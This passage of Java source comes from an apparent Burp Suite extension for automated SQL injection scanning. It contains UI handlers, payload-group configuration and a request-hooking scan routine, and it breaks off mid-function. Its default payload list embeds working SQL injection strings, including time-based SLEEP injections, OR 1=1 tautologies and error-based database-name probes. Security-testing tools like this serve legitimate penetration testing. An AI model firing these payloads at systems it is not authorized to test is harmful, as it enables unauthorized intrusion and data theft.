                api.logging().logToOutput("关闭 值是数字则进行-1、-0");
                isInt = 0;
            }
        });

        chkbox5.addItemListener(e -> {
            if (chkbox5.isSelected()) {
                api.logging().logToOutput("启动 自定义payload");
                payloadTextArea.setEditable(true);
                payloadTextArea.setBackground(Color.WHITE);
                jTextAreaInt = 1;
                if (diyPayload1 == 1) {
                    String temp = payloadTextArea.getText();
                    temp = temp.replaceAll(" ", "%20");
                    jTextAreaData1 = temp;
                } else {
                    jTextAreaData1 = payloadTextArea.getText();
                }
            } else {
                api.logging().logToOutput("关闭 自定义payload");
                payloadTextArea.setEditable(false);
                payloadTextArea.setBackground(Color.LIGHT_GRAY);
                jTextAreaInt = 0;
            }
        });

        chkbox6.addItemListener(e -> {
            if (chkbox6.isSelected()) {
                api.logging().logToOutput("启动 空格url编码");
                diyPayload1 = 1;
                String temp = payloadTextArea.getText();
                temp = temp.replaceAll(" ", "%20");
                jTextAreaData1 = temp;
            } else {
                api.logging().logToOutput("关闭 空格url编码");
                diyPayload1 = 0;
                jTextAreaData1 = payloadTextArea.getText();
            }
        });

        chkbox7.addItemListener(e -> {
            if (chkbox7.isSelected()) {
                api.logging().logToOutput("启动 自定义payload参数值置空");
                diyPayload2 = 1;
            } else {
                api.logging().logToOutput("关闭 自定义payload参数值置空");
                diyPayload2 = 0;
            }
        });

        chkbox8.addItemListener(e -> {
            if (chkbox8.isSelected()) {
                api.logging().logToOutput("启动 测试Cookie");
            } else {
                api.logging().logToOutput("关闭 测试Cookie");
            }
        });

        // ====== 新增：参数FUZZ功能监听器 ======
        enableFuzzParamsCheckBox.addItemListener(e -> {
            if (enableFuzzParamsCheckBox.isSelected()) {
                api.logging().logToOutput("启动 参数FUZZ探测");
                enableFuzzParams = 1;
                fuzzParamsTextArea.setBackground(Color.LIGHT_GRAY);
                fuzzParamsTextArea.setEditable(false);
                fuzzParamsList.clear();
                String[] lines = fuzzParamsTextArea.getText().split("\\n");
                for (String line : lines) {
                    if (!line.trim().isEmpty()) {
                        fuzzParamsList.add(line.trim());
                    }
                }
            } else {
                api.logging().logToOutput("关闭 参数FUZZ探测");
                enableFuzzParams = 0;
                fuzzParamsTextArea.setBackground(Color.WHITE);
                fuzzParamsTextArea.setEditable(true);
            }
        });

        saveFuzzParamsBtn.addActionListener(e -> {
            try {
                String text = fuzzParamsTextArea.getText();
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_fuzz_params.ini")))) {
                    out.write(text);
                }
                fuzzParamsList.clear();
                for (String line : text.split("\\n")) {
                    String trimmedLine = line.trim();
                    if (!trimmedLine.isEmpty()) {
                        fuzzParamsList.add(trimmedLine);
                    }
                }
                api.logging().logToOutput("已保存FUZZ参数配置，共" + fuzzParamsList.size() + "个");
                JOptionPane.showMessageDialog(null, "FUZZ参数配置已保存！", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存FUZZ参数配置失败: " + ex.getMessage());
                JOptionPane.showMessageDialog(null, "保存失败: " + ex.getMessage(), "错误", JOptionPane.ERROR_MESSAGE);
            }
        });
        // ===================================

        noFilterRadio.addActionListener(e -> {
            if (noFilterRadio.isSelected()) {
                paramListMode = 0;
                api.logging().logToOutput("参数过滤模式: 无过滤");
            }
        });

        whiteListRadio.addActionListener(e -> {
            if (whiteListRadio.isSelected()) {
                paramListMode = 1;
                api.logging().logToOutput("参数过滤模式: 白名单模式");
            }
        });

        blackListRadio.addActionListener(e -> {
            if (blackListRadio.isSelected()) {
                paramListMode = 2;
                api.logging().logToOutput("参数过滤模式: 黑名单模式");
            }
        });

        saveParamListBtn.addActionListener(e -> {
            try {
                String paramListText = paramListTextArea.getText();
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_param_filter_mode.ini")))) {
                    out.write(String.valueOf(paramListMode));
                }
                if (whiteListRadio.isSelected()) {
                    try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_whitelist.ini")))) {
                        out.write(paramListText);
                    }
                    whiteListParams.clear();
                    for (String line : paramListText.split("\\n")) {
                        String trimmedLine = line.trim();
                        if (!trimmedLine.isEmpty()) {
                            whiteListParams.add(trimmedLine);
                        }
                    }
                    api.logging().logToOutput("白名单参数已更新，共" + whiteListParams.size() + "个");
                } else if (blackListRadio.isSelected()) {
                    try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_blacklist.ini")))) {
                        out.write(paramListText);
                    }
                    blackListParams.clear();
                    for (String line : paramListText.split("\\n")) {
                        String trimmedLine = line.trim();
                        if (!trimmedLine.isEmpty()) {
                            blackListParams.add(trimmedLine);
                        }
                    }
                    api.logging().logToOutput("黑名单参数已更新，共" + blackListParams.size() + "个");
                }
                api.logging().logToOutput("参数过滤模式已保存: " + paramListMode);
                JOptionPane.showMessageDialog(null, "参数配置已保存！", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存参数配置失败: " + ex.getMessage());
                ex.printStackTrace();
            }
        });

        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_blacklist.ini")))) {
            String str;
            blackListParams.clear();
            while ((str = in.readLine()) != null) {
                String trimmedLine = str.trim();
                if (!trimmedLine.isEmpty()) {
                    blackListParams.add(trimmedLine);
                }
            }
        } catch (IOException e) {
        }

        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_param_filter_mode.ini")))) {
            String modeText = in.readLine();
            if (modeText != null && !modeText.trim().isEmpty()) {
                paramListMode = Integer.parseInt(modeText.trim());
                switch (paramListMode) {
                    case 0:
                        noFilterRadio.setSelected(true);
                        break;
                    case 1:
                        whiteListRadio.setSelected(true);
                        try (BufferedReader whiteIn = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_whitelist.ini")))) {
                            String str, strData = "";
                            while ((str = whiteIn.readLine()) != null) {
                                strData += str + "\n";
                            }
                            paramListTextArea.setText(strData);
                        } catch (IOException ex) {
                        }
                        break;
                    case 2:
                        blackListRadio.setSelected(true);
                        try (BufferedReader blackIn = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_blacklist.ini")))) {
                            String str, strData = "";
                            while ((str = blackIn.readLine()) != null) {
                                strData += str + "\n";
                            }
                            paramListTextArea.setText(strData);
                        } catch (IOException ex) {
                        }
                        break;
                }
                api.logging().logToOutput("已加载参数过滤模式: " + paramListMode);
            }
        } catch (IOException | NumberFormatException e) {
            paramListMode = 0;
            noFilterRadio.setSelected(true);
        }

        btn1.addActionListener(e -> {
            log.clear();
            log2.clear();
            log3.clear();
            log4Md5.clear();
            count = 0;
            fireTableRowsInserted(log.size(), log.size());
            model.fireTableRowsInserted(log3.size(), log3.size());
        });

        btn2.addActionListener(e -> {
            if (diyPayload1 == 1) {
                String temp = payloadTextArea.getText();
                temp = temp.replaceAll(" ", "%20");
                jTextAreaData1 = temp;
            } else {
                jTextAreaData1 = payloadTextArea.getText();
            }
            saveCurrentGroupPayload(jTextAreaData1);
            try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_diy_error.ini")))) {
                out.write(errorKeywordsTextArea.getText());
            } catch (IOException ex) {
                api.logging().logToOutput("写入报错信息配置文件失败: '" + ex.getMessage() + "'");
            }
        });

        btn3.addActionListener(e -> {
            if (btn3.getText().equals("启动白名单")) {
                btn3.setText("关闭白名单");
                whiteURL = whiteTextField.getText();
                whiteSwitchs = 1;
                whiteTextField.setEditable(false);
                whiteTextField.setForeground(Color.GRAY);
            } else {
                btn3.setText("启动白名单");
                whiteSwitchs = 0;
                whiteTextField.setEditable(true);
                whiteTextField.setForeground(Color.BLACK);
            }
        });

        saveErrorBtn.addActionListener(e -> {
            try {
                String errorText = errorKeywordsTextArea.getText();
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_diy_error.ini")))) {
                    out.write(errorText);
                }
                updateErrorKeywordsList();
                api.logging().logToOutput("已保存自定义报错信息配置");
                JOptionPane.showMessageDialog(null, "报错信息配置已保存！", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存报错信息配置失败: " + ex.getMessage());
                JOptionPane.showMessageDialog(null, "保存失败: " + ex.getMessage(), "错误", JOptionPane.ERROR_MESSAGE);
            }
        });

        enableCustomErrorCheckBox.addItemListener(e -> {
            if (enableCustomErrorCheckBox.isSelected()) {
                api.logging().logToOutput("启用自定义报错信息检测");
                enableCustomError = 1;
                errorKeywordsTextArea.setEditable(false);
                errorKeywordsTextArea.setBackground(Color.LIGHT_GRAY);
                updateErrorKeywordsList();
            } else {
                api.logging().logToOutput("关闭自定义报错信息检测");
                enableCustomError = 0;
                errorKeywordsTextArea.setEditable(true);
                errorKeywordsTextArea.setBackground(Color.WHITE);
            }
        });

        errorKeywordsTextArea.addFocusListener(new java.awt.event.FocusAdapter() {
            @Override
            public void focusLost(java.awt.event.FocusEvent evt) {
                if (enableCustomError == 0) { 
                    updateErrorKeywordsList();
                }
            }
        });

        saveResponseTimeThresholdBtn.addActionListener(e -> {
            try {
                String thresholdText = responseTimeThresholdField.getText().trim();
                int newThreshold = Integer.parseInt(thresholdText);
                if (newThreshold < 100) {
                    JOptionPane.showMessageDialog(null, "阈值不能小于100毫秒", "警告", JOptionPane.WARNING_MESSAGE);
                    return;
                }
                if (newThreshold > 10000) {
                    JOptionPane.showMessageDialog(null, "阈值不能大于10000毫秒", "警告", JOptionPane.WARNING_MESSAGE);
                    return;
                }
                responseTimeThreshold = newThreshold;
                api.logging().logToOutput("响应时间阈值已更新为: " + responseTimeThreshold + "毫秒");
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_response_time_threshold.ini")))) {
                    out.write(String.valueOf(responseTimeThreshold));
                }
                JOptionPane.showMessageDialog(null, "响应时间阈值已保存: " + responseTimeThreshold + "毫秒", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (NumberFormatException ex) {
                JOptionPane.showMessageDialog(null, "请输入有效的数字", "错误", JOptionPane.ERROR_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存阈值配置失败: " + ex.getMessage());
            }
        });

        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_response_time_threshold.ini")))) {
            String thresholdText = in.readLine();
            if (thresholdText != null && !thresholdText.trim().isEmpty()) {
                responseTimeThreshold = Integer.parseInt(thresholdText.trim());
                responseTimeThresholdField.setText(String.valueOf(responseTimeThreshold));
                api.logging().logToOutput("已加载响应时间阈值: " + responseTimeThreshold + "毫秒");
            }
        } catch (IOException | NumberFormatException e) {
        }

        newGroupBtn.addActionListener(e -> {
            String newGroupName = newGroupNameField.getText();
            createNewGroup(newGroupName);
        });

        deleteGroupBtn.addActionListener(e -> {
            deleteCurrentGroup();
        });

        renameGroupBtn.addActionListener(e -> {
            String newGroupName = newGroupNameField.getText();
            renameCurrentGroup(newGroupName);
        });

        payloadGroupComboBox.addActionListener(e -> {
            String selectedGroup = (String) payloadGroupComboBox.getSelectedItem();
            if (selectedGroup != null && !selectedGroup.equals(currentGroup)) {
                switchToGroup(selectedGroup);
            }
        });

        saveLengthDiffThresholdBtn.addActionListener(e -> {
            try {
                String thresholdText = lengthDiffThresholdField.getText().trim();
                int newThreshold = Integer.parseInt(thresholdText);
                if (newThreshold < 1) {
                    JOptionPane.showMessageDialog(null, "阈值不能小于1字节", "警告", JOptionPane.WARNING_MESSAGE);
                    return;
                }
                if (newThreshold > 10000) {
                    JOptionPane.showMessageDialog(null, "阈值不能大于10000字节", "警告", JOptionPane.WARNING_MESSAGE);
                    return;
                }

                lengthDiffThreshold = newThreshold;
                api.logging().logToOutput("长度差异阈值已更新为: " + lengthDiffThreshold + "字节");

                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_length_diff_threshold.ini")))) {
                    out.write(String.valueOf(lengthDiffThreshold));
                }
                JOptionPane.showMessageDialog(null, "长度差异阈值已保存: " + lengthDiffThreshold + "字节", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (NumberFormatException ex) {
                JOptionPane.showMessageDialog(null, "请输入有效的数字", "错误", JOptionPane.ERROR_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存长度差异阈值配置失败: " + ex.getMessage());
            }
        });

        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_length_diff_threshold.ini")))) {
            String thresholdText = in.readLine();
            if (thresholdText != null && !thresholdText.trim().isEmpty()) {
                lengthDiffThreshold = Integer.parseInt(thresholdText.trim());
                lengthDiffThresholdField.setText(String.valueOf(lengthDiffThreshold));
                api.logging().logToOutput("已加载长度差异阈值: " + lengthDiffThreshold + "字节");
            }
        } catch (IOException | NumberFormatException e) {
        }

        saveBlackListUrlBtn.addActionListener(e -> {
            try {
                String urlListText = blackListUrlTextArea.getText();
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_blacklist_urls.ini")))) {
                    out.write(urlListText);
                }
                blackListUrls.clear();
                for (String line : urlListText.split("\\n")) {
                    String trimmedLine = line.trim();
                    if (!trimmedLine.isEmpty()) {
                        blackListUrls.add(trimmedLine);
                    }
                }
                api.logging().logToOutput("已保存黑名单URL配置，共" + blackListUrls.size() + "条");
                JOptionPane.showMessageDialog(null, "黑名单URL配置已保存！", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存黑名单URL配置失败: " + ex.getMessage());
                JOptionPane.showMessageDialog(null, "保存失败: " + ex.getMessage(), "错误", JOptionPane.ERROR_MESSAGE);
            }
        });

        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_blacklist_urls.ini")))) {
            String str, strData = "";
            while ((str = in.readLine()) != null) {
                strData += str + "\n";
            }
            blackListUrlTextArea.setText(strData);
            blackListUrls.clear();
            for (String line : strData.split("\\n")) {
                String trimmedLine = line.trim();
                if (!trimmedLine.isEmpty()) {
                    blackListUrls.add(trimmedLine);
                }
            }
            api.logging().logToOutput("已加载黑名单URL配置，共" + blackListUrls.size() + "条");
        } catch (IOException e) {
        }
        initializePayloadGroups();
    }

    private void initializePayloadGroups() {
        payloadGroups.clear();
        payloadGroupComboBox.removeAllItems();
        payloadGroups.add("default");
        payloadGroupComboBox.addItem("default");

        File configDir = new File(CONFIG_DIR);
        File[] files = configDir.listFiles((dir1, name) -> name.startsWith("xia_SQL_payload_") && name.endsWith(".ini"));
        if (files != null) {
            for (File file : files) {
                String fileName = file.getName();
                String groupName = fileName.substring(16, fileName.length() - 4);
                if (!"default".equals(groupName) && !payloadGroups.contains(groupName)) {
                    payloadGroups.add(groupName);
                    payloadGroupComboBox.addItem(groupName);
                }
            }
        }
        payloadGroupComboBox.setSelectedItem(currentGroup);
        loadCurrentGroupPayload();
        api.logging().logToOutput("已初始化payload组，共" + payloadGroups.size() + "个组");
    }

    private void loadCurrentGroupPayload() {
        String filename = "default".equals(currentGroup) ?
            getConfigFilePath("xia_SQL_diy_payload.ini") :
            getConfigFilePath("xia_SQL_payload_" + currentGroup + ".ini");

        try (BufferedReader in = new BufferedReader(new FileReader(filename))) {
            String str, strData = "";
            while ((str = in.readLine()) != null) {
                strData += str + "\n";
            }
            payloadTextArea.setText(strData);
            api.logging().logToOutput("已加载组 '" + currentGroup + "' 的payload");
        } catch (IOException e) {
            payloadTextArea.setText("'''\n\"\"\"\n'+Or+1=1+AND+'Xlz'='Xlz\n'+Or+1=2+AND+'Xlz'='Xlz\n'||1/1||\n'||1/0||\n'%df'%20and%20sleep(3)%23\n'and%20'1'='1\nAND%201=1\nAND+sleep(5)\n%20AND%20(SELECT%208778%20FROM%20(SELECT(SLEEP(5)))nXpZ)\n'||1=if(substr(database(),1,1)='1',exp(999),1)||\n'and(select*from(select+sleep(5))a/**/union/**/select+1)='\nAND%20(SELECT%206242%20FROM%20(SELECT(SLEEP(5)))MgdE)\n')and(select*from(select+sleep(5))a/**/union/**/select+1)--\n1');SELECT+SLEEP(5)#\n(SELECT%207138%20FROM%20(SELECT(SLEEP(5)))tNVE)\n(select*from(select%20if(substr(database(),1,1)='j',exp(709),exp(710)))a)");
            api.logging().logToOutput("组 '" + currentGroup + "' 的配置文件不存在，使用默认值");
        }
    }

    private void saveCurrentGroupPayload(String payloadContent) {
        String filename = "default".equals(currentGroup) ?
            getConfigFilePath("xia_SQL_diy_payload.ini") :
            getConfigFilePath("xia_SQL_payload_" + currentGroup + ".ini");

        try (BufferedWriter out = new BufferedWriter(new FileWriter(filename))) {
            out.write(payloadContent);
            api.logging().logToOutput("已保存组 '" + currentGroup + "' 的payload到文件: " + filename);
        } catch (IOException e) {
            api.logging().logToOutput("保存组 '" + currentGroup + "' 的payload失败: " + e.getMessage());
        }
    }

    private void createNewGroup(String groupName) {
        if (groupName == null || groupName.trim().isEmpty()) {
            JOptionPane.showMessageDialog(null, "组名不能为空", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }

        groupName = groupName.trim();
        if (payloadGroups.contains(groupName)) {
            JOptionPane.showMessageDialog(null, "组名 '" + groupName + "' 已存在", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }

        payloadGroups.add(groupName);
        payloadGroupComboBox.addItem(groupName);
        payloadGroupComboBox.setSelectedItem(groupName);
        currentGroup = groupName;
        newGroupNameField.setText("新组名");
        String currentContent = payloadTextArea.getText();
        saveCurrentGroupPayload(currentContent);

        api.logging().logToOutput("已创建新payload组: " + groupName);
        JOptionPane.showMessageDialog(null, "已创建新组: " + groupName, "成功", JOptionPane.INFORMATION_MESSAGE);
    }

    private void deleteCurrentGroup() {
        if ("default".equals(currentGroup)) {
            JOptionPane.showMessageDialog(null, "不能删除default组", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }

        int choice = JOptionPane.showConfirmDialog(null,
            "确定要删除组 '" + currentGroup + "' 吗？",
            "确认删除",
            JOptionPane.YES_NO_OPTION);

        if (choice == JOptionPane.YES_OPTION) {
            String filename = getConfigFilePath("xia_SQL_payload_" + currentGroup + ".ini");
            File file = new File(filename);
            if (file.exists()) {
                file.delete();
            }

            payloadGroups.remove(currentGroup);
            payloadGroupComboBox.removeItem(currentGroup);

            currentGroup = "default";
            payloadGroupComboBox.setSelectedItem(currentGroup);
            loadCurrentGroupPayload();

            api.logging().logToOutput("已删除payload组: " + currentGroup);
            JOptionPane.showMessageDialog(null, "已删除组，已切换到default组", "成功", JOptionPane.INFORMATION_MESSAGE);
        }
    }

    private void renameCurrentGroup(String newGroupName) {
        if ("default".equals(currentGroup)) {
            JOptionPane.showMessageDialog(null, "不能重命名default组", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }
        
        if (newGroupName == null || newGroupName.trim().isEmpty()) {
            JOptionPane.showMessageDialog(null, "新组名不能为空", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }
        
        newGroupName = newGroupName.trim();
        if (payloadGroups.contains(newGroupName)) {
            JOptionPane.showMessageDialog(null, "新组名 '" + newGroupName + "' 已存在", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }

        String currentContent = payloadTextArea.getText();
        String newFilename = getConfigFilePath("xia_SQL_payload_" + newGroupName + ".ini");
        try (BufferedWriter out = new BufferedWriter(new FileWriter(newFilename))) {
            out.write(currentContent);
        } catch (IOException e) {
            api.logging().logToOutput("保存新组文件失败: " + e.getMessage());
            JOptionPane.showMessageDialog(null, "重命名失败：无法创建新文件", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }

        String oldFilename = getConfigFilePath("xia_SQL_payload_" + currentGroup + ".ini");
        File oldFile = new File(oldFilename);
        if (oldFile.exists()) {
            if (!oldFile.delete()) {
                api.logging().logToOutput("删除旧文件失败: " + oldFilename);
            }
        }

        int oldIndex = payloadGroups.indexOf(currentGroup);
        payloadGroups.set(oldIndex, newGroupName);
        
        payloadGroupComboBox.removeItem(currentGroup);
        payloadGroupComboBox.addItem(newGroupName);
        payloadGroupComboBox.setSelectedItem(newGroupName);
        
        currentGroup = newGroupName;
        newGroupNameField.setText("新组名");
        
        api.logging().logToOutput("已重命名payload组: " + currentGroup);
        JOptionPane.showMessageDialog(null, "已重命名组为: " + currentGroup, "成功", JOptionPane.INFORMATION_MESSAGE);
    }

    private void switchToGroup(String groupName) {
        if (!groupName.equals(currentGroup)) {
            currentGroup = groupName;
            loadCurrentGroupPayload();
            api.logging().logToOutput("已切换到payload组: " + currentGroup);
        }
    }

    private void updateErrorKeywordsList() {
        errorKeywordsList.clear();
        String text = errorKeywordsTextArea.getText();
        String[] lines = text.split("\\n");
        for (String line : lines) {
            line = line.trim();
            if (!line.isEmpty()) {
                errorKeywordsList.add(line);
            }
        }
        api.logging().logToOutput("已更新报错关键字列表，共" + errorKeywordsList.size() + "条");
    }

    @Override
    public RequestToBeSentAction handleHttpRequestToBeSent(HttpRequestToBeSent requestToBeSent) {
        return RequestToBeSentAction.continueWith(requestToBeSent);
    }

    @Override
    public ResponseReceivedAction handleHttpResponseReceived(HttpResponseReceived responseReceived) {
        if (switchs == 1) {
            burp.api.montoya.core.ToolSource toolSource = responseReceived.toolSource();
            if (toolSource != null && toolSource.toolType() != null) {
                ToolType toolType = toolSource.toolType();
                int toolFlag = 0;

                if (toolType == ToolType.REPEATER) {
                    toolFlag = 64;
                } else if (toolType == ToolType.PROXY) {
                    toolFlag = 4;
                } else if (toolType == ToolType.SCANNER) {
                    toolFlag = 16;
                } else if (toolType == ToolType.INTRUDER) {
                    toolFlag = 32;
                } else {
                    api.logging().logToOutput("未处理的工具类型: " + toolType + ", toolFlag=0");
                }

                api.logging().logToOutput("工具来源: " + toolType + ", toolFlag=" + toolFlag + 
                                        ", clicksRepeater=" + clicksRepeater + ", clicksProxy=" + clicksProxy);

                if ((clicksRepeater == 64 && toolFlag == 64) || 
                    (clicksProxy == 4 && toolFlag == 4) ||
                    (toolFlag == 16) || (toolFlag == 32)) {
                    final int finalToolFlag = toolFlag;
                    new Thread(() -> {
                        try {
                            checkVul(burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(
                                responseReceived.initiatingRequest(), responseReceived), finalToolFlag);
                        } catch (Exception ex) {
                            api.logging().logToOutput("处理HTTP响应时出错: " + ex.toString());
                        }
                    }).start();
                }
            }
        }
        return ResponseReceivedAction.continueWith(responseReceived);
    }

    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        List<Component> menuItems = new ArrayList<>();

        if (event.isFromTool(ToolType.SCANNER) || event.isFromTool(ToolType.PROXY) || 
            event.isFromTool(ToolType.REPEATER) || event.isFromTool(ToolType.INTRUDER)) {
            JMenuItem sendItem = new JMenuItem("Send to DouSQL");
            sendItem.addActionListener(e -> {
                if (switchs == 1) {
                    java.util.Optional<MessageEditorHttpRequestResponse> messageOpt = event.messageEditorRequestResponse();
                    if (messageOpt.isPresent()) {
                        new Thread(() -> {
                            try {
                                checkVul(messageOpt.get().requestResponse(), 1024);
                            } catch (Exception ex) {
                                api.logging().logToOutput("处理右键发送时出错: " + ex.toString());
                            }
                        }).start();
                    }
                } else {
                    api.logging().logToOutput("插件DouSQL关闭状态！");
                }
            });
            menuItems.add(sendItem);
        }

        return menuItems;
    }

    private boolean isUrlMatched(String url, String pattern) {
        try {
            String regex = pattern
                .replace(".", "\\.")
                .replace("*", ".*")
                .replace("?", ".");
            return url.matches(".*" + regex + ".*");
        } catch (Exception e) {
            return url.contains(pattern);
        }
    }

    private String replaceJsonValue(String jsonBody, String paramName, String newValue) {
        try {
            JsonUtils jsonUtils = api.utilities().jsonUtils();
            if (!jsonUtils.isValidJson(jsonBody)) {
                api.logging().logToOutput("  -> 无效的JSON格式");
                return jsonBody;
            }
            java.util.List<String> foundPaths = findJsonPaths(jsonBody, paramName);
            if (foundPaths.isEmpty()) {
                api.logging().logToOutput("  -> 未找到参数: " + paramName);
                return jsonBody;
            }
            String path = foundPaths.get(0);
            String modifiedJson = jsonUtils.update(jsonBody, path, "\"" + newValue + "\"");
            api.logging().logToOutput("  -> JSON替换成功，路径: " + path);
            return modifiedJson;
        } catch (Exception e) {
            api.logging().logToOutput("  -> JSON处理异常: " + e.getMessage());
            return jsonBody;
        }
    }
    
    private java.util.List<String> findJsonPaths(String jsonBody, String paramName) {
        java.util.List<String> paths = new java.util.ArrayList<>();
        try {
            JsonNode rootNode = JsonNode.jsonNode(jsonBody);
            findJsonPathsRecursive(rootNode, "", paramName, paths);
        } catch (Exception e) {
            api.logging().logToOutput("  -> 查找JSON路径异常: " + e.getMessage());
        }
        return paths;
    }
    
    private void findJsonPathsRecursive(JsonNode node, String currentPath, String targetParam, java.util.List<String> paths) {
        try {
            if (node.isObject()) {
                JsonObjectNode objectNode = node.asObject();
                for (String key : objectNode.asMap().keySet()) {
                    String newPath = currentPath.isEmpty() ? key : currentPath + "." + key;
                    if (key.equals(targetParam)) {
                        paths.add(newPath);
                    }
                    JsonNode childNode = objectNode.get(key);
                    if (childNode != null) {
                        findJsonPathsRecursive(childNode, newPath, targetParam, paths);
                    }
                }
            } else if (node.isArray()) {
                JsonArrayNode arrayNode = node.asArray();
                for (int i = 0; i < arrayNode.asList().size(); i++) {
                    String newPath = currentPath + "[" + i + "]";
                    JsonNode childNode = arrayNode.get(i);
                    if (childNode != null) {
                        findJsonPathsRecursive(childNode, newPath, targetParam, paths);
                    }
                }
            }
        } catch (Exception e) {
            api.logging().logToOutput("  -> 递归查找路径异常: " + e.getMessage());
        }
    }
    
    private static class JsonStructureInfo {
        boolean hasNestedObjects = false;
        boolean hasArrays = false;
        int maxDepth = 0;
        int objectCount = 0;
        int arrayCount = 0;
    }
    
    private JsonStructureInfo analyzeJsonStructure(String json) {
        JsonStructureInfo info = new JsonStructureInfo();
        try {
            JsonNode rootNode = JsonNode.jsonNode(json);
            analyzeJsonNodeRecursive(rootNode, 0, info);
        } catch (Exception e) {
            api.logging().logToOutput("JSON结构分析异常: " + e.getMessage());
        }
        return info;
    }
    
    private void analyzeJsonNodeRecursive(JsonNode node, int currentDepth, JsonStructureInfo info) {
        if (currentDepth > 20) { 
            return;
        }
        info.maxDepth = Math.max(info.maxDepth, currentDepth);
        try {
            if (node.isObject()) {
                info.objectCount++;
                if (currentDepth > 0) {
                    info.hasNestedObjects = true;
                }
                JsonObjectNode objectNode = node.asObject();
                for (String key : objectNode.asMap().keySet()) {
                    JsonNode childNode = objectNode.get(key);
                    if (childNode != null) {
                        analyzeJsonNodeRecursive(childNode, currentDepth + 1, info);
                    }
                }
            } else if (node.isArray()) {
                info.arrayCount++;
                info.hasArrays = true;
                JsonArrayNode arrayNode = node.asArray();
                for (int i = 0; i < arrayNode.asList().size(); i++) {
                    JsonNode childNode = arrayNode.get(i);
                    if (childNode != null) {
                        analyzeJsonNodeRecursive(childNode, currentDepth + 1, info);
                    }
                }
            }
        } catch (Exception e) {
            api.logging().logToOutput("递归分析异常: " + e.getMessage());
        }
    }

    // ====== 修复并发重复扫描问题的 checkVul 完整代码 ======
    private void checkVul(HttpRequestResponse baseRequestResponse, int toolFlag) {
        if (baseRequestResponse == null || baseRequestResponse.request() == null) return;

        String md5Data = null; 
        try {
            HttpRequest request = baseRequestResponse.request();
            String url = request.url();
            String method = request.method();

            // 1. 方法过滤
            if (!method.equalsIgnoreCase("GET") && !method.equalsIgnoreCase("POST")) return;

            // 2. 白名单过滤
            if (whiteSwitchs == 1 && !whiteURL.isEmpty()) {
                boolean isWhiteListed = false;
                for (String white : whiteURL.split(",")) {
                    if (url.contains(white.trim())) { isWhiteListed = true; break; }
                }
                if (!isWhiteListed) return;
            }

            // 3. 黑名单URL过滤
            if (!blackListUrls.isEmpty()) {
                for (String blackUrl : blackListUrls) if (isUrlMatched(url, blackUrl)) return;
            }

            // 4. 静态文件过滤 (仅针对 Proxy/Repeater 自动监听)
            if (toolFlag == 4 || toolFlag == 64) { 
                String[] staticFiles = {"jpg", "jpeg", "png", "gif", "css", "js", "ico", "woff", "woff2", "svg", "bmp", "pdf", "zip", "rar"};
                for (String ext : staticFiles) if (url.toLowerCase().endsWith("." + ext)) return;
            }

            // 5. 构建指纹 (MD5)
            String tempData = url.split("\\?")[0]; 
            int isAdd = 0;
            List<ParsedHttpParameter> paraLists = request.parameters();
            for (ParsedHttpParameter para : paraLists) {
                HttpParameterType type = para.type();
                if (type == HttpParameterType.URL || type == HttpParameterType.BODY ||
                    type == HttpParameterType.JSON || (isCookie >= 0 && type == HttpParameterType.COOKIE)) {
                    if (isAdd == 0) isAdd = 1;
                    tempData += "+" + para.name();
                }
            }
            tempData += "+" + request.method();
            md5Data = MD5(tempData);

            // --- 核心修复：加锁防止并发重复 (Fix Bug 4) ---
            // 必须用 synchronized 锁住去重列表，防止多个线程同时判断"未扫描"从而重复入队
            synchronized (log4Md5) {
                for (RequestMd5 md5Item : log4Md5) {
                    if (md5Item.md5Data.equals(md5Data)) {
                        if (toolFlag == 1024) {
                            // 如果是右键手动发送 (Send to DouSQL)，强制生成新指纹以允许扫描
                            md5Data = MD5(String.valueOf(System.currentTimeMillis())); 
                        } else {
                            // 如果是自动监听的，发现重复直接退出
                            return; 
                        }
                    }
                }
                // 只有确认不重复后，才加入列表占位
                log4Md5.add(new RequestMd5(md5Data));
            }
            // --------------------------------

            if (isAdd != 0) {
                // 6. 参数筛选
                List<ParsedHttpParameter> testableParams = new ArrayList<>();
                for (ParsedHttpParameter para : paraLists) {
                     HttpParameterType type = para.type();
                     if (type == HttpParameterType.URL || type == HttpParameterType.BODY || type == HttpParameterType.JSON || 
                         (isCookie >= 0 && type == HttpParameterType.COOKIE) || 
